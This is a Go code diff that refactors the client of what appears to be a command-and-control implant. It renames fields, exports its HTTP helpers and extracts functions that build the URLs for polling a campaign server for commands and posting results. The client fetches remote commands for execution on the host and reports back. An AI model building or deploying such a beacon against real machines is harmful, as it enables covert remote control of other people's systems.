@@ -17,27 +17,41 @@ var ErrNoCommandsFound = errors.New("Server did not return any commands")
 
 type Client struct {
 	config   ClientConfig
-	campgain model.Campaign
+	Campaign model.Campaign
 	coder    model.Coder
 
 	commandExec CommandExec
 }
 
 func NewClient() Client {
-	campaign := model.MakeCampgain()
+	config := MakeClientConfig()
+	campaign := model.MakeCampaign()
 	coder := model.MakeCoder(campaign)
 
-	w := Client{MakeClientConfig(), campaign, coder, MakeCommandExec()}
+	w := Client{
+		config,
+		campaign,
+		coder,
+		MakeCommandExec(),
+	}
 	return w
 }
 
-func (s Client) httpGet(url string) (*http.Response, error) {
+func (s Client) CommandGetUrl() string {
+	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.config.ComputerId
+}
+
+func (s Client) CommandSendUrl() string {
+	return s.Campaign.ServerUrl + s.Campaign.CommandSendPath
+}
+
+func (s Client) HttpGet(url string) (*http.Response, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("X-Session-Token", s.campgain.ApiKey)
+	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
 	res, err := client.Do(req)
 	if err != nil {
 		return nil, err
@@ -45,13 +59,13 @@ func (s Client) httpGet(url string) (*http.Response, error) {
 	return res, nil
 }
 
-func (s Client) httpPost(url string, data *bytes.Reader) (*http.Response, error) {
+func (s Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest("POST", url, data)
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("X-Session-Token", s.campgain.ApiKey)
+	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
 	res, err := client.Do(req)
 	if err != nil {
 		return nil, err
@@ -109,8 +123,8 @@ func (s Client) requestAndExecute() {
 }
 
 func (s Client) getCommand() (model.CommandBase, error) {
-	url := s.campgain.ServerUrl + s.campgain.CommandGetPath + s.config.ComputerId
-	resp, err := s.httpGet(url)
+	url := s.CommandGetUrl()
+	resp, err := s.HttpGet(url)
 	if err != nil {
 		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
 	}
@@ -134,7 +148,7 @@ func (s Client) getCommand() (model.CommandBase, error) {
 }
 
 func (s Client) sendCommand(command model.CommandBase) error {
-	url := s.campgain.ServerUrl + s.campgain.CommandSendPath
+	url := s.CommandSendUrl()
 
 	// Setup response
 	command.ComputerId = s.config.ComputerId
@@ -152,7 +166,7 @@ func (s Client) sendCommand(command model.CommandBase) error {
 		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
 	}
 
-	resp, err := s.httpPost(url, bytes.NewReader(data))
+	resp, err := s.HttpPost(url, bytes.NewReader(data))
 	if err != nil {
 		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
 	}
